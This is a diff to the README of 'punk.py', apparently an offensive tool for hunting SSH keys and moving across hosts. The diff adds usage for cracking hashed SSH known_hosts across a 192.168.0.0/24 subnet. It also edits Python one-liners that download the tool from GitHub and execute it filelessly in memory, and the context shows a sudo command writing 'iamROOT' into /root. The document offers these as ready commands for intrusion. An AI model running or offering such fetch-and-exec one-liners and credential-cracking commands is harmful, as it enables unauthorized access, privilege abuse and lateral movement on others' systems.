@@ -38,21 +38,25 @@ execute commands with sudo:
  ~$ ./punk.py --run "sudo sh -c 'echo iamROOT>/root/hacked.txt'"
 ```
 
+cracking ssh hashed known hosts:
+```
+ ~$ ./punk.py --crack 192.168.0.0/24
+```
+
 python2 one-liner fileless ( with --no-passwd parameter ):
 ```
  ~$ python -c "import urllib2;exec(urllib2.urlopen('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').read())" --no-passwd
 ```
 
-python3 one-liner fileless ( with --crack parameter ):
+python3 one-liner fileless:
 ```
-~$ python3 -c "import requests;exec(requests.get('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').text)"
+ ~$ python3 -c "import requests;exec(requests.get('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').text)"
 ```
 
 
 
 ## TODO
 
- - !! Hashed known_hosts bruteforce ( https://blog.rootshell.be/2010/11/03/bruteforcing-ssh-known_hosts-files/ )
  - improve private keys hunting including dsa keys
  - Recursion
  - SSH keys with password bruteforce
